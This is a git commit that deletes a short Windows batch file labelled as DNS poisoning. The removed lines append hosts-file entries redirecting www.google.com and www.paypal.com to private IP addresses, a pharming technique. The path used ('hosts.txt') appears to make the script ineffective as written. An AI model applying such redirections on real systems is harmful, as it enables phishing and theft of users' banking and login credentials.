b013d1e810e8cc06f9c36b7c0b72e437989642c3
Aanjul <32233726+Aanjul@users.noreply.github.com>
2021-11-25 15:11:55 +0530

    script is in batch file not in python

--- script_works_DNS_poisioning_batch_file_modifies_the_dns_host_file.bat
+++
@@ -1,6 +0,0 @@
-::For refrence https://securitydiaries.com/11-insane-things-can-batch-programming/
-
-@echo off
-echo 10.109.74.45 www.google.com >> C:\windows\system32\drivers\etc\hosts.txt
-echo 10.115.46.73 www.paypal.com >> C:\windows\system32\drivers\etc\hosts.txt
-exit
